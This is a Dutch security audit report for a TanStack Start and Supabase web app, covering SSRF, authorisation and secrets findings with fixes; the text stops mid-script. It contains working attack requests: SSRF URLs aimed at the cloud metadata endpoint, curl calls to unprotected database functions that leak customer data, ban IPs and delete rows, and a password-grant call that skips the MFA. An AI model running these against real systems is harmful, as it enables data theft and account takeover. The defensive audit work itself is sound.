# Security Audit — aimi-digital-craft

**Datum:** 2026-08-24
**Scope:** volledige codebase (TanStack Start + Supabase + Nitro node-server op Hetzner VPS)
**Commit:** `dda7a04` (branch `main`, 427 commits)
**Methode:** statische analyse van alle server-side bestanden, alle 42 SQL-migraties, git-historie, `npm audit`, plus één empirische runtime-test van de SSRF-bescherming.
**Er is niets gewijzigd aan de code.** Dit rapport is uitsluitend analyse.

---

## 1. Executive summary

### Aantallen per severity

| Severity | Aantal |
|---|---|
| CRITICAL | 4 |
| HIGH | 9 |
| MEDIUM | 17 |
| LOW | 14 |
| INFO / gecontroleerd-in-orde | 21 |

### Top 5 risico's

1. **CRITICAL — SSRF-bescherming van de Website Checker is volledig te omzeilen met een IP-adres in plaats van een hostname**; empirisch bevestigd dat `http://169.254.169.254/` de server rechtstreeks laat verbinden (Hetzner cloud metadata).
2. **CRITICAL — Vijf `SECURITY DEFINER`-databasefuncties zijn zonder inloggen aanroepbaar via PostgREST**, waarmee een willekeurige bezoeker de complete klantenlijst kan uitlezen en willekeurige IP-adressen kan bannen.
3. **CRITICAL — De Telegram-MFA is geen echte authenticatiepoort**: omdat de anon-key in de browserbundel zit, kan iedereen met wachtwoord direct bij Supabase inloggen en de tweede factor overslaan.
4. **HIGH — `is_blocked` en `access_expires_at` worden nergens server-side per request gecontroleerd**; een geblokkeerd account houdt volledige API-toegang.
5. **HIGH — `GOOGLE_CLIENT_SECRET` staat permanent in de git-historie** (commit `5bc9ff0`, zichtbaar t/m `54af09c^`) en moet als gecompromitteerd worden beschouwd.

### Wat er goed is (belangrijk om te benoemen)

De autorisatielaag op de server functions is aantoonbaar solide. Mass assignment is over de volledige codebase dicht via strikte Zod-whitelists zonder `passthrough()`. Alle 23 klantgerichte portal-functies hebben een expliciete ownership-check vóór elke mutatie. Rollenbeheer is voor 100% voorzien van een audit trail en zelf-degradatie is geblokkeerd. Rol-escalatie via de database is aantoonbaar onmogelijk: `user_roles`, `user_custom_roles` en `role_permissions` zijn geen van drieën schrijfbaar voor `anon` of `authenticated`. Er is geen enkele `dangerouslySetInnerHTML` met user-content, geen dynamische SQL, en de open-redirect op de wachtwoordreset-link is correct afgevangen met een exacte host-allowlist.

---

## 2. Attack surface inventaris (Fase 0)

### 2.1 Server-side draaiende bestanden

| Bestand | Regels | Rol |
|---|---|---|
| `src/server.ts` | 316 | Nitro fetch-entry: security headers, rate limiting, error-normalisatie |
| `src/start.ts` | 24 | Bootstrap |
| `src/lib/admin.functions.ts` | 3976 | 96 admin server functions |
| `src/lib/portal.functions.ts` | 709 | 23 klant server functions |
| `src/lib/accounts.functions.ts` | 310 | 18 account server functions |
| `src/lib/monitoring.functions.ts` | 160 | 12 monitoring-proxy functions |
| `src/lib/telegram.functions.ts` | 341 | 13 functions, waarvan 3 pre-auth |
| `src/lib/contact.functions.ts` | 110 | 4 functions, waarvan 1 publiek |
| `src/lib/website-checker.functions.ts` | 62 | 1 publieke function |
| `src/lib/website-checker.server.ts` | 472 | SSRF-gevoelige fetch + HTML-analyse |
| `src/lib/admin.server.ts` | 321 | 11 service-role helpers |
| `src/lib/accounts.server.ts` | 109 | 4 service-role helpers |
| `src/lib/telegram.server.ts` | 346 | 6 service-role helpers incl. webhook-handler |
| `src/lib/auth-guards.server.ts` | 39 | `ensureAdmin` / `ensureSuperAdmin` / `ensureStaff` |
| `src/lib/permissions.server.ts` | 88 | `ensurePermission`, effectieve-permissieberekening |
| `src/lib/rate-limit.ts` | 58 | Postgres-backed rate limiting + IP-bans |
| `src/lib/email.server.ts` | 116 | Nodemailer, welkomstmail |
| `src/lib/monitoring.shared.ts` | 155 | `assertPublicHost`, `measureResponseTime` |
| `src/lib/error-capture.ts` / `error-page.ts` | 27 / 30 | SSR-crashafhandeling |
| `src/integrations/supabase/client.server.ts` | 41 | **service-role client (RLS-bypass)** |
| `src/integrations/supabase/auth-middleware.ts` | 80 | Bearer-token-validatie |
| `src/integrations/supabase/client.ts` | 40 | anon-client, ook SSR |
| `src/routes/api/**` | 4 bestanden | HTTP-routes (zie 2.3) |
| `src/routes/track[.]js.tsx` | — | Serveert het tracking-script |
| `src/routes/sitemap[.]xml.tsx` | — | Genereert sitemap |
| `ecosystem.config.cjs` | 61 | PM2-config, parseert `.env` |
| `scripts/deploy.sh` | 41 | Deploy naar VPS |
| `scripts/set-telegram-webhook.ts` | — | Eenmalige webhook-registratie |

### 2.2 Server functions — totaal 167

| Module | Aantal | Ongeauthenticeerd |
|---|---|---|
| `admin.functions.ts` | 96 | 2 (`adminGetMyRoles`, `adminGetMyEffectivePermissions` — bewust: eigen data) |
| `portal.functions.ts` | 23 | 0 |
| `accounts.functions.ts` | 18 | 0 |
| `telegram.functions.ts` | 13 | 3 (`loginStart`, `loginVerifyMfa`, `loginResendMfa` — bewust pre-auth) |
| `monitoring.functions.ts` | 12 | 0 |
| `contact.functions.ts` | 4 | 1 (`submitContactForm` — bewust publiek) |
| `website-checker.functions.ts` | 1 | 1 (`checkWebsite` — bewust publiek) |

**Volledig ongeauthenticeerd aanvalsoppervlak: 5 server functions.** Alle vijf zijn een bewuste keuze; `checkWebsite` is de gevaarlijkste (zie SEC-01).

### 2.3 HTTP API-routes — 4

| Route | Methode | Auth | Oordeel |
|---|---|---|---|
| `/api/telegram/webhook` | POST | `X-Telegram-Bot-Api-Secret-Token` vs `TELEGRAM_WEBHOOK_SECRET` | Correct beveiligd, fail-closed. Vergelijking niet constant-time (LOW-06) |
| `/api/public/hooks/expire-accounts` | POST | `CRON_SECRET` via Bearer of `X-Cron-Secret`, `timingSafeEqual` | Correct, fail-closed |
| `/api/public/site-ping` | POST, OPTIONS | **Geen** | Publiek, `Access-Control-Allow-Origin: *`. Rate-limited, profiel-bestaanscheck. Zie MED-09 |
| `/api/public/site-error` | POST | **Geen** | Publiek. Rate-limited 5/10min. Zie MED-08 |

### 2.4 Supabase RPC's die de app aanroept

`check_rate_limit`, `is_ip_banned`, `record_strike`, `site_ping_counts`, `project_last_activity`. Alle vijf zijn `SECURITY DEFINER` en alle vijf zijn tevens rechtstreeks door een bezoeker aanroepbaar — dat is CRIT-02.

### 2.5 Formulieren en user input

| Bron | Bestand | Validatie |
|---|---|---|
| Contactformulier (publiek) | `Contact.tsx` → `contact.functions.ts:7` | Zod + honeypot + rate limit |
| Website Checker (publiek) | `website-checker.tsx` → `website-checker.functions.ts:31` | Zod URL |
| Login + MFA-code (publiek) | `login.tsx` → `telegram.functions.ts:227/289/320` | Zod |
| Wijzigingsverzoek + bijlagen | `portal.tsx:607` → `portal.functions.ts:317` | Zod, MIME-check client-side |
| Onboarding wizard | `OnboardingWizard.tsx` → `portal.functions.ts:138` | Zod whitelist |
| Profielbewerking | `account.tsx` → `portal.functions.ts:92` | Zod whitelist |
| Chat (klant + admin) | `ChatWidget.tsx` / `AdminChatPanel.tsx` | Direct via Supabase-client onder RLS |
| Leads CSV-import | `LeadsPanel.tsx:336` → `admin.functions.ts:3562` | Zod, max 5000 |
| Alle admin-CRUD | 96 functions | Zod whitelists |

### 2.6 File uploads — 2

1. **`change-attachments`** (Supabase Storage, privé) — `portal.tsx:287-300`. Client-side MIME-allowlist en 10 MB-limiet. **Geen server-side hercontrole**, geen `allowed_mime_types` of `file_size_limit` op de bucket in enige migratie. Zie MED-04.
2. **`chat-attachments`** (Supabase Storage, privé) — padstructuur `<uid>/<chat_id>/`.

Daarnaast leest `LeadsPanel.tsx:336` een CSV puur als tekst in — geen opslag als bestand.

### 2.7 Externe HTTP-calls

| Doel | Vanaf | Trigger | SSRF-relevant |
|---|---|---|---|
| Willekeurige URL van bezoeker | `website-checker.server.ts:149` | **Publiek** | **Ja — CRIT-01** |
| `profiles.website_url` | `monitoring.shared.ts:56` | Staff | Afgedekt via `assertPublicHost` |
| SSL/DNS-check op klantdomein | `admin.functions.ts:3023/3051` | Admin | Afgedekt via `assertPublicHost` |
| `https://aimi-development.nl/monitoring-api/api` | `monitoring.functions.ts:24` | Admin | Vaste host |
| Telegram Bot API | `telegram.server.ts:44` | Server | Vaste host |
| SMTP | `email.server.ts` | Server | Vaste host |
| Calendly (browser) | `Contact.tsx` | Bezoeker | Client-side |

### 2.8 Cron / scheduled jobs

| Job | Waar | Auth |
|---|---|---|
| `cleanup-website-checks` (dagelijks 03:00) | pg_cron, `20260823120000_website_checker.sql:47` | Draait als migratie-rol (`postgres`) |
| `expire-accounts` | Externe cron → `/api/public/hooks/expire-accounts` | `CRON_SECRET` |
| Opportunistische cleanup `site_response_times` | `site-ping.ts:72`, 5% kans per request | Geen (inline) |
| Monitoring-scripts op de VPS | **Buiten deze repo** | Handmatig verifiëren |

### 2.9 Websockets

Supabase Realtime op `chats`/`chat_messages`. RLS op `realtime.messages` is expliciet ingesteld (`20260523231640:23-37`) en scopet op het eigen chat-topic. **Gecontroleerd, in orde.**

### 2.10 Databaseobjecten

- **Tabellen:** 46 (zie sectie 5, Fase 3)
- **Views / materialized views:** 0 in versiebeheer
- **Functies:** 16, waarvan 9 `SECURITY DEFINER`
- **Triggers:** 4, waarvan 1 op `auth.users`
- **Storage buckets:** 2 (`change-attachments`, `chat-attachments`), beide privé
- **pg_cron jobs:** 1

### 2.11 Data-flow map

```
PUBLIEK (geen auth)
  contactformulier ──► contact_submissions ──► BerichtenTab (JSX-tekst, veilig)
                   └─► Telegram-notificatie (naam+email+bericht naar VS)
  website-checker  ──► [server fetch naar opgegeven URL]  ◄── CRIT-01
                   └─► website_checks.resultaten (JSONB) ──► nergens getoond
  track.js ping    ──► site_pings / site_response_times ──► admin + portal
  site-error       ──► site_errors ──► portal-dashboard (JSX-tekst, veilig)
  login/MFA        ──► telegram_pending_logins (tokens plaintext) ──► browser

KLANT (JWT, RLS actief)
  profiel/onboarding ──► profiles ──► admin-detail (website_url in <a href>) ◄── MED-01
  wijzigingsverzoek  ──► change_requests + change_attachments ──► admin
                     └─► "Website:"-regel in omschrijving ──► <a href> ◄── MED-01
  chat               ──► chat_messages ──► AdminChatPanel

STAFF/ADMIN (JWT + ensureX, meestal service-role client)
  alle CRUD ──► supabaseAdmin (RLS-bypass) ──► audit_log (deels)
  CSV-export ──► Blob download ◄── MED-03 (formule-injectie)
```

---

## 3. Autorisatiematrix

De volledige matrix per functie is te groot voor dit hoofdstuk; hieronder de geaggregeerde uitkomst per module, gevolgd door alle uitzonderingen. Elke van de 167 server functions is individueel nagelopen.

### 3.1 Samenvatting

| Module | Middleware `requireSupabaseAuth` | Rolcheck aanwezig | Ownership/tenant-scoping | Zod-validatie |
|---|---|---|---|---|
| `portal.functions.ts` (23) | 23/23 | n.v.t. (klant) | **23/23** | 18/23 (rest heeft geen input) |
| `accounts.functions.ts` (18) | 18/18 | 18/18 | Rolmodel, geen tenants | 15/18 |
| `admin.functions.ts` (96) | 96/96 | 94/96 (2 bewust: eigen data) | Rolmodel | 88/96 |
| `monitoring.functions.ts` (12) | 12/12 | 12/12 (`ensureAdmin`) | n.v.t. | 11/12 (`resolveAlert` niet) |
| `contact.functions.ts` (4) | 3/4 | 3/4 | n.v.t. | 4/4 |
| `telegram.functions.ts` (13) | 10/13 | 10/13 | n.v.t. | 13/13 |
| `website-checker.functions.ts` (1) | 0/1 | 0/1 | n.v.t. | 1/1 |

### 3.2 Rolsets (`src/lib/rbac.ts:38-40`)

| Guard | Rollen |
|---|---|
| `ensureAdmin` | `super_admin`, `co_admin`, `admin` |
| `ensureSuperAdmin` | `super_admin`, `admin` |
| `ensureStaff` | `super_admin`, `co_admin`, `support_agent`, **`viewer`**, `admin` |

### 3.3 Uitzonderingen die aandacht vragen

| Functie | Locatie | Guard | Probleem |
|---|---|---|---|
| `adminMarkPasswordResetHandled` | `admin.functions.ts:1417` | `ensureStaff` | `viewer` (read-only rol) kan muteren |
| `adminCreateProjectTimeEntry` | `admin.functions.ts:2347` | `ensureStaff` | `viewer` kan uren boeken op willekeurige `user_id` |
| `adminSyncCustomerMonitoring` | `admin.functions.ts:2891` | `ensureStaff` | `viewer` kan schrijven |
| `adminSnoozeAlert` | `admin.functions.ts:3113` | `ensureStaff` | `viewer` kan muteren |
| `adminMarkAlertSeen` | `admin.functions.ts:3129` | `ensureStaff` | `viewer` kan muteren |
| `adminToggleContactHandled` | `contact.functions.ts:86` | `ensureStaff` | `viewer` kan muteren |
| `adminSetPassword` | `admin.functions.ts:741` | `ensureAdmin` | `co_admin` kan wachtwoord van `super_admin` zetten |
| `adminSetMfaEnabled` | `telegram.functions.ts:73` | `ensureAdmin` | `co_admin` kan MFA van `super_admin` uitzetten |
| `adminUnlinkTelegram` | `telegram.functions.ts:45` | `ensureAdmin` | idem |
| `adminChangeRole` | `admin.functions.ts:1196` | `ensureSuperAdmin` | Mist `ensurePermission("manage_team")` die de tweelingfunctie wél heeft |
| `resolveAlert` | `monitoring.functions.ts:110` | `ensureAdmin` | `.validator((id: string) => id)` — geen validatie |

### 3.4 Route-level autorisatie — 0 van 14

| Route | Server-side rolcheck | Client-side |
|---|---|---|
| `/_authenticated` | **Nee** — `beforeLoad` returnt bij SSR (`_authenticated.tsx:14`) | Sessiecheck |
| `/admin` en 9 subroutes | **Nee** | `usePermissions()` |
| `/server` | **Nee** | `perms.can("view_admin")` |
| `/portal`, `/account` | **Nee** | — |

Geen enkele route heeft een server-side rolcheck. De volledige beveiliging rust op de server-function-guards. Zie HIGH-05.

---

## 4. Bevindingen

### CRITICAL

---

#### CRIT-01 — SSRF-bescherming volledig te omzeilen met een IP-adres

**Locatie:** `src/lib/website-checker.server.ts:78-115` (`safeLookup`, `ssrfSafeAgent`), `:117-121` (`assertHttpUrl`)

**Probleem.** De bescherming steunt volledig op een custom `lookup`-functie die op de undici `Agent` hangt. De code gaat ervan uit dat die lookup bij élke verbinding draait — de comment op regel 11-17 stelt dat expliciet. Dat klopt niet. Node's `net.Socket.connect` slaat DNS-resolutie volledig over zodra de host al een geldig IP-adres is (`net.isIP(host)` is truthy). De custom lookup wordt dan nooit aangeroepen, en er is geen andere controle op het doel: `assertHttpUrl` kijkt alleen naar het protocol, niet naar de host.

**Empirisch bevestigd.** Met exact dezelfde Agent-configuratie als in de code, waarbij de lookup elk verzoek zou blokkeren:

```
http://127.0.0.1:3000/    lookup aangeroepen voor: []  → ECONNREFUSED 127.0.0.1:3000
http://10.0.0.1:8080/     lookup aangeroepen voor: []  → Connect Timeout (attempted address: 10.0.0.1:8080)
http://[::1]:3000/        lookup aangeroepen voor: []  → ECONNREFUSED ::1:3000
http://2130706433/        lookup aangeroepen voor: []  → ECONNREFUSED 127.0.0.1:80
http://169.254.169.254/   lookup aangeroepen voor: []  → Connect Timeout (attempted address: 169.254.169.254:80)
http://example.com/       lookup aangeroepen voor: ["example.com"] → BLOCKED-BY-LOOKUP
```

Alleen bij een hostname draait de bescherming. Bij elk IP-adres — dotted-quad, decimaal of IPv6 — wordt rechtstreeks een socket geopend. De `BLOCKED_IPV4_RANGES`-lijst (regel 34-46) wordt in die gevallen nooit geraadpleegd.

**Exploitscenario.**
1. Aanvaller opent `/website-checker` — geen account nodig.
2. Hij voert in: `http://169.254.169.254/hetzner/v1/metadata`.
3. `UrlInput` (`website-checker.functions.ts:9-24`) accepteert dit; het is een geldige http-URL.
4. `fetchSafely` opent de socket rechtstreeks naar het metadata-endpoint.
5. Hij leest de uitkomst af aan het rapport: `<title>` wordt letterlijk teruggegeven (`safeText($("title")...)`, regel 334), en statuscode, responstijd, aanwezigheid van een viewport-tag, aantal `<h1>`'s en het alt-tekstpercentage vormen samen een bruikbaar orakel.
6. Met `http://127.0.0.1:3000/`, `:3002`, `:5432`, `:6379` scant hij interne poorten: `ECONNREFUSED` geeft een andere uitkomst en andere timing dan een open poort.

Aanvullend: de tool haalt ná de hoofdpagina ook `/robots.txt` en `/sitemap.xml` op het finale origin op (regel 424-427). Ook die gaan via hetzelfde gat.

**Impact.** Een ongeauthenticeerde bezoeker laat de productieserver interne diensten benaderen: het Hetzner metadata-endpoint, de app zelf op `localhost:3000`, de monitoring-API op `:3002`, Postgres, Redis, en elk adres in het private netwerk. Omdat het rapport gedeeltelijke inhoud en betrouwbare timing teruggeeft, is dit geen blinde SSRF maar een leesbaar orakel. Samen met MED-06 (geen poortrestrictie) en HIGH-02 (rate limiting omzeilbaar) is dit een onbeperkte interne portscanner.

**Fix.** Valideer het doel-IP expliciet vóór de fetch en bij elke redirect-hop. Voeg toe aan `website-checker.server.ts`:

```ts
import { isIP } from "node:net";
import { promises as dnsPromises } from "node:dns";

const ALLOWED_PORTS = new Set(["", "80", "443", "8080", "8443"]);

/** Valideert de host van een URL vóórdat er een socket geopend wordt. Dekt het
 *  gat dat safeLookup laat vallen: Node slaat dns.lookup over wanneer de host
 *  al een IP-literal is, waardoor de blocklist daar nooit draait. */
async function assertSafeTarget(url: URL): Promise<void> {
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    throw new Error("Alleen http en https URLs zijn toegestaan.");
  }
  if (!ALLOWED_PORTS.has(url.port)) throw new SsrfBlockedError(url.hostname);

  // URL.hostname levert IPv6 met blokhaken: [::1] -> ::1
  const host = url.hostname.replace(/^\[|\]$/g, "").toLowerCase();

  if (BLOCKED_HOSTNAMES.has(host)) throw new SsrfBlockedError(host);
  if (host.endsWith(".localhost") || host.endsWith(".local") || host.endsWith(".internal")) {
    throw new SsrfBlockedError(host);
  }

  const family = isIP(host);
  if (family !== 0) {
    // IP-literal: safeLookup draait hier NIET, dus hier zelf controleren.
    if (isBlockedIp(host, family)) throw new SsrfBlockedError(host);
    return;
  }

  // Hostname: resolve en controleer elk adres. safeLookup herhaalt dit vlak
  // vóór de connectie (DNS-rebinding); deze check is aanvullend, niet vervangend.
  const addrs = await dnsPromises.lookup(host, { all: true, verbatim: true });
  if (addrs.length === 0) throw new Error("DNS-resolutie leverde geen adressen op");
  for (const a of addrs) {
    if (isBlockedIp(a.address, a.family)) throw new SsrfBlockedError(host);
  }
}
```

Vervang vervolgens de drie `assertHttpUrl`-aanroepen:

```ts
// fetchSafely, regel 144:
    await assertSafeTarget(current);
// fetchSafely, regel 161 (na het opbouwen van de redirect-URL):
      await assertSafeTarget(next);
// runWebsiteCheck, regel 245:
  await assertSafeTarget(startUrl);
```

`safeLookup` moet blijven bestaan: die dekt DNS-rebinding af, wat `assertSafeTarget` alleen niet kan.

**Hersteltijd:** 1–2 uur inclusief testen.

---

#### CRIT-02 — Vijf `SECURITY DEFINER`-functies zijn ongeauthenticeerd aanroepbaar

**Locatie:**
- `supabase/migrations/20260717170000_perf2_site_ping_counts.sql:14` — `site_ping_counts`
- `supabase/migrations/20260717150000_sec5_durable_rate_limit.sql:41,68,90` — `check_rate_limit`, `is_ip_banned`, `record_strike`
- `supabase/migrations/20260717180000_perf3_project_last_activity.sql:9` — `project_last_activity`
- `supabase/migrations/20260823120000_website_checker.sql:27` — `cleanup_old_website_checks`

**Probleem.** In PostgreSQL krijgt een nieuwe functie standaard `EXECUTE` voor `PUBLIC`, en Supabase publiceert elke functie in het `public`-schema als PostgREST RPC-endpoint voor `anon` en `authenticated`. De vroege migraties trekken dat netjes in (`20260523183958:6-7`, `20260523222619:23`). **Alle latere `SECURITY DEFINER`-functies missen die REVOKE.** Omdat ze met DEFINER-rechten draaien, omzeilen ze bovendien alle RLS.

De comment in `20260717170000:12` stelt dat de functie "alleen vanuit server-fns achter `ensureStaff`" wordt aangeroepen. Dat is een aanname over de aanroeper, geen afdwinging in de database.

**Exploitscenario.** De anon-key en de project-URL staan per definitie in de browserbundel (aangetroffen in `.output/public/assets/index-*.js`). Daarmee:

```bash
# 1. Volledige klantenlijst — omzeilt de own_pings RLS-policy
curl -X POST 'https://<ref>.supabase.co/rest/v1/rpc/site_ping_counts' \
  -H "apikey: <anon-key>" -H "Content-Type: application/json" \
  -d '{"p_user_ids": null}'

# 2. Willekeurig IP bannen, escalerend tot 7 dagen (migratie regel 105-110)
curl -X POST 'https://<ref>.supabase.co/rest/v1/rpc/record_strike' \
  -H "apikey: <anon-key>" -H "Content-Type: application/json" \
  -d '{"p_ip": "1.2.3.4"}'

# 3. Ongeauthenticeerde DELETE op productiedata
curl -X POST 'https://<ref>.supabase.co/rest/v1/rpc/cleanup_old_website_checks' \
  -H "apikey: <anon-key>"

# 4. Audit-log-timestamps per project, buiten de super_admin-policy om
curl -X POST 'https://<ref>.supabase.co/rest/v1/rpc/project_last_activity' \
  -H "apikey: <anon-key>" -H "Content-Type: application/json" \
  -d '{"p_project_ids": ["<uuid>"]}'
```

**Impact.** Datalek van de complete klantenlijst zonder inloggen. Volledige ondermijning van SEC-5: een aanvaller kan het IP van een klant, een concurrent of een Cloudflare-range bannen en de site voor anderen onbruikbaar maken, terwijl hij zelf geen bans oploopt. Plus een ongeauthenticeerde DELETE.

**Fix.** Eén migratie:

```sql
-- Trek PUBLIC-EXECUTE in op alles in public en geef alleen terug wat de
-- browser-client echt nodig heeft. ALTER DEFAULT PRIVILEGES zorgt dat nieuwe
-- functies hierna niet opnieuw automatisch openstaan.
REVOKE EXECUTE ON ALL FUNCTIONS IN SCHEMA public FROM PUBLIC, anon, authenticated;

ALTER DEFAULT PRIVILEGES IN SCHEMA public
  REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC, anon, authenticated;

GRANT EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.available_credits(uuid) TO authenticated;
```

`check_rate_limit`, `is_ip_banned`, `record_strike`, `site_ping_counts` en `project_last_activity` blijven werken: de app roept ze aan via `supabaseAdmin` (`rate-limit.ts:17,32,43`), en `service_role` omzeilt deze rechten.

**Hersteltijd:** 30 minuten inclusief verificatie.

---

#### CRIT-03 — Telegram-MFA is geen authenticatiepoort en is te omzeilen

**Locatie:** `src/lib/telegram.functions.ts:227-287` (`loginStart`), in combinatie met `src/integrations/supabase/client.ts:8-27`

**Probleem.** `loginStart` doet server-side een `signInWithPassword` met de **publishable/anon-key** — dezelfde key die in de browserbundel staat. Zodra het wachtwoord klopt bestaat de Supabase-sessie al; de MFA-stap houdt de tokens alleen achter in `telegram_pending_logins` en geeft ze pas vrij na een geldige code. GoTrue kent deze factor niet: er is geen AAL2, geen `amr`-claim, geen MFA-enrollment. Het JWT uit de wachtwoord-login is volwaardig, en `requireSupabaseAuth` (`auth-middleware.ts:63-70`) valideert alleen `getClaims`.

Een aanvaller hoeft `loginStart` dus helemaal niet te gebruiken.

**Exploitscenario.**
1. Aanvaller heeft e-mail + wachtwoord van een admin (phishing, hergebruik, of via HIGH-04).
2. Hij opent de loginpagina; de client-side Supabase-instantie is daar al geïmporteerd (`login.tsx:4`).
3. In de console: `await supabase.auth.signInWithPassword({ email, password })` — of geheel buiten de browser om:
   ```bash
   curl -X POST 'https://<ref>.supabase.co/auth/v1/token?grant_type=password' \
     -H "apikey: <anon-key>" -H "Content-Type: application/json" \
     -d '{"email":"admin@…","password":"…"}'
   ```
4. Hij krijgt een geldig access- en refresh-token. Er is geen Telegram-bericht verstuurd; het slachtoffer merkt niets.
5. Elke server function accepteert dat token, inclusief alle `ensureSuperAdmin`-functies.

**Impact.** De tweede factor beschermt niets. Elk account waarvan het wachtwoord bekend is, is volledig over te nemen — zonder detectie, want de Telegram-melding die normaal bij een login hoort blijft uit.

**Fix.** Er is geen kleine fix; MFA moet naar een laag waar Supabase hem afdwingt.

*Optie A (aanbevolen) — Supabase's eigen MFA.* Zet TOTP-MFA aan in het dashboard, en dwing AAL2 af in de middleware:

```ts
// src/integrations/supabase/auth-middleware.ts, tussen regel 70 en 72
    // Zonder deze check is elk wachtwoord-only JWT volwaardig en is MFA
    // cosmetisch: de client kan de MFA-serverfn simpelweg overslaan.
    if (data.claims.aal !== "aal2") {
      const { data: p } = await supabase
        .from("profiles").select("mfa_enabled").eq("id", data.claims.sub).maybeSingle();
      if (p?.mfa_enabled) throw new Error("Unauthorized: MFA required");
    }
```
Dwing het daarnaast af in de RLS-policies van gevoelige tabellen met `(auth.jwt() ->> 'aal') = 'aal2'`.

*Optie B — password grant sluiten voor de anon-key.* Zet e-mail/wachtwoord-login uit voor publieke clients in het Supabase-dashboard en laat `loginStart` authenticeren met een server-only key. Dan is `loginStart` de enige weg naar binnen en is de Telegram-stap wél een echte poort. **Handmatig verifiëren of jouw Supabase-plan deze configuratie ondersteunt.**

Fix in beide gevallen éérst HIGH-04, want dat is het goedkoopste pad naar een admin-wachtwoord.

**Hersteltijd:** 1–2 dagen (optie A), of 2 uur plus dashboardonderzoek (optie B).

---

#### CRIT-04 — `GOOGLE_CLIENT_SECRET` staat permanent in de git-historie

**Locatie:** commit `5bc9ff0` ("google authenticatoin"), zichtbaar in `.env` t/m `54af09c^`

**Probleem.** `.env` is getrackt geweest en is pas in `54af09c` ("Remove .env from tracking") verwijderd. De inhoud staat daarmee permanent in de objectdatabase. Concreet in de historie:

| Secret | Commits | Status |
|---|---|---|
| `GOOGLE_CLIENT_SECRET=GOCSPX-m…` | `5bc9ff0` → `54af09c^` | **Gecompromitteerd** |
| `GOOGLE_CLIENT_ID=17607696…` | idem | Niet geheim, wel gekoppeld |
| `SUPABASE_PUBLISHABLE_KEY` (anon, oud project `koyzevitfgrbjpdmbqoa`) | `54af09c^`, `260e9c9` | Publiek van aard; het oude project is exposed |

Overige commits met `.env`-inhoud: `7529657`, `9ed5748`, `260e9c9`, `1514d2b`.

**Wat níet gelekt is** — expliciet gecontroleerd met `git log -S`: de huidige `SUPABASE_SERVICE_ROLE_KEY`, `MONITORING_ADMIN_KEY`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_WEBHOOK_SECRET` en `IP_HASH_SALT` komen nergens in de historie voor. De huidige `.env` is correct untracked (`.gitignore:36-38`) en `git ls-files` bevestigt dat alleen `.env.example` getrackt is.

**Exploitscenario.** Is de repository ooit publiek geweest, of leest iemand met read-toegang de historie uit, dan is de OAuth client secret bruikbaar. Samen met de client-id vormt hij een geldig OAuth-clientpaar; de reikwijdte hangt af van de scopes op die client.

**Impact.** In de huidige code wordt geen Google OAuth meer gebruikt (gecontroleerd: geen `signInWithOAuth` in `src/`), dus de directe exploiteerbaarheid hangt ervan af of die client nog bestaat in de Google Cloud Console.

**Fix.**
1. Google Cloud Console → APIs & Services → Credentials: verwijder de OAuth-client `17607696…`, of roteer de secret als hij nog in gebruik is.
2. Controleer of het oude Supabase-project `koyzevitfgrbjpdmbqoa` nog bestaat. Zo ja: verwijderen, of verifiëren dat RLS daar strak staat. `supabase/config.toml:1` verwijst er nog naar terwijl `.env` het nieuwe project `pbnjjicmahuwfghwsymg` gebruikt — die inconsistentie ook opruimen.
3. Historie herschrijven (`git filter-repo`) is alleen zinvol als de repo nooit gedeeld is. Bij twijfel is roteren de enige betrouwbare mitigatie, niet uitwissen.

**Hersteltijd:** 30 minuten.

---
### HIGH

---

#### HIGH-01 — `is_blocked` en `access_expires_at` worden nergens server-side afgedwongen

**Locatie:** `src/integrations/supabase/auth-middleware.ts:63-78`; client-side check in `src/routes/_authenticated.tsx:60-77`

**Probleem.** Blokkeren zet alleen een vlag in `profiles`. De enige plek waar die vlag gevolgen heeft is een client-side poll (`checkMyAccess`) die elke 5 minuten draait en bij `blocked || expired` een `signOut()` doet. Die code staat in de browser en heeft bovendien een `catch {}` op regel 69 die fouten slikt. `requireSupabaseAuth` controleert uitsluitend de JWT-geldigheid — geen `is_blocked`, geen `access_expires_at`. Geen enkele van de 167 server functions roept een blokkade-guard aan. `expireBlockedAccountsImpl` (`accounts.server.ts:86-108`) zet alleen de vlag en trekt geen sessies in.

**Exploitscenario.** Een klant wordt geblokkeerd wegens wanbetaling. Hij blokkeert de `checkMyAccess`-request in devtools, of gebruikt simpelweg curl met zijn opgeslagen token, en houdt volledige toegang tot alle portal-functies. Omdat `autoRefreshToken: true` staat en de refresh-token niet is ingetrokken, blijft dit onbeperkt werken.

**Impact.** Blokkeren en het verlopen van toegang zijn cosmetisch. Commercieel relevant, en bij een blokkade wegens misbruik ook een beveiligingsprobleem.

**Fix.** Dwing het af in de middleware — één plek voor alle 167 functions:

```ts
// src/integrations/supabase/auth-middleware.ts — vervang regel 72-78
    // Hoort server-side gecontroleerd te worden: een client-side check is
    // triviaal te omzeilen en het JWT blijft na blokkeren geldig tot expiry.
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_blocked, access_expires_at")
      .eq("id", data.claims.sub)
      .maybeSingle();

    if (profile?.is_blocked) throw new Error("Forbidden: account geblokkeerd");
    if (profile?.access_expires_at && new Date(profile.access_expires_at) < new Date()) {
      throw new Error("Forbidden: toegang verlopen");
    }

    return next({ context: { supabase, userId: data.claims.sub, claims: data.claims } });
```

Dit voegt één query per server-function-aanroep toe. Die loopt onder RLS via de bestaande `users read own profile`-policy en raakt de primary key, dus hij is goedkoop. Wil je de latency drukken, cache dan per `userId` in een `Map` met een TTL van 30 seconden.

Roep daarnaast bij het blokkeren `supabaseAdmin.auth.admin.signOut(userId, "global")` aan in `adminSetBlocked` (`accounts.functions.ts:78`), zodat bestaande refresh-tokens meteen sneuvelen.

**Hersteltijd:** 1 uur.

---

#### HIGH-02 — Rate limiting is te omzeilen door `cf-connecting-ip` te spoofen

**Locatie:** `src/lib/rate-limit.ts:54-58` (`getClientIp`)

**Probleem.** De functie leest primair `cf-connecting-ip` en valt terug op `x-forwarded-for`. De comment op regel 49-53 stelt dat `cf-connecting-ip` "niet door de client te overschrijven" is. Dat geldt alléén als Cloudflare daadwerkelijk vóór de server staat én nginx de header van niet-Cloudflare-bronnen strip. Beide zijn uit deze repo niet vast te stellen. Staat er geen Cloudflare voor, of is het VPS-IP rechtstreeks bereikbaar, dan zet elke client de header zelf.

**Exploitscenario.**
```bash
for i in $(seq 1 10000); do
